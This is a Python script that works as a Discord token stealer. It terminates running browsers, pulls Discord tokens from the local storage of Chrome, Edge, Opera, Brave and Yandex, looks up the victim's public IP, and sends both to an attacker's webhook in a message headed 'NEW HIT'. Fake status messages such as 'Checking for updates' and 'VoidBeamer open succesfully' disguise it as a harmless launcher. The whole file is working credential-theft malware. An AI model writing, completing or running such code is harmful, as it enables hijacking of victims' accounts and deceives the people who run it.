import os
import psutil
import time
import io
import sys
import requests
from re import findall

WEBHOOK_URL = "your webhook here"

# Get system paths
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")

# Paths to browser-stored Discord tokens
DISCORD_PATHS = {
    "Edge": LOCAL + "\\Microsoft\\Edge\\User Data\\Default",
    "Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}

# ======== BROWSER KILLER ========
def kill_browsers():
    """Kills all browser processes to unlock cookie files"""
    browser_processes = ["chrome.exe", "edge.exe", "opera.exe", "brave.exe", "yandex.exe"]
    for process in psutil.process_iter(attrs=['pid', 'name']):
        if process.info['name'].lower() in browser_processes:
            try:
                psutil.Process(process.info['pid']).terminate()
            except psutil.NoSuchProcess:
                pass
    time.sleep(2)  # Wait for processes to close

# ======== DISCORD TOKEN EXTRACTOR ========
def get_discord_tokens(path):
    """Extracts Discord tokens from browser storage"""
    path += "\\Local Storage\\leveldb"
    tokens = []
    if not os.path.exists(path):
        return tokens
    
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        with open(f"{path}\\{file_name}", errors="ignore") as file:
            for line in file.readlines():
                for token in findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", line) + findall(r"mfa\.[\w-]{84}", line):
                    tokens.append(token)
    
    return list(set(tokens))

# ======== MAIN FUNCTION ========
def get_ip():
    try:
        response = requests.get("https://api64.ipify.org?format=json")  # Get public IP
        ip = response.json().get("ip", "Unknown IP")  # Extract IP
        return ip
    except Exception as e:
        return f"Failed to get IP: {e}"  # Handle errors

def main():
    kill_browsers()  # Kill browsers to unlock storage

    # Get IP Address
    ip_address = get_ip()
    print("Loading resources")

    print("Checking for updates")
    found_tokens = []

    for browser, path in DISCORD_PATHS.items():
        tokens = get_discord_tokens(path)
        if tokens:
            print("VoidBeam Downloading")
            found_tokens.extend(tokens)

    # Format tokens properly
    tokens_message = ", ".join(found_tokens) if found_tokens else "No Discord tokens found."

    # Image URL (Change this to your own image)
    image_url = "https://media.discordapp.net/attachments/1343645843999424563/1352723085903794298/logoss.jpg?ex=67df0d0c&is=67ddbb8c&hm=7bbcf20fdd1eb7bdbe55d02240c84454f9614ec24384853fd28602e487c84555&=&format=webp"  

    # Construct the final message
    data = {
        "content": "@everyone # NEW HIT",
        "embeds": [
            {
                "title": "TokenLogger",
                "description": f"📡 **IP Address:** `{ip_address}`\n\n🎮 **Discord Tokens:** `{tokens_message}`",
                "color": 65280,  # green color
                "image": {"url": image_url}  # Embed image
            }
        ]
    }

    # Send everything in one message
    response = requests.post(WEBHOOK_URL, json=data)
    print("Opening...")

    print("VoidBeamer open succesfully, wait")

if __name__ == "__main__":
    main()
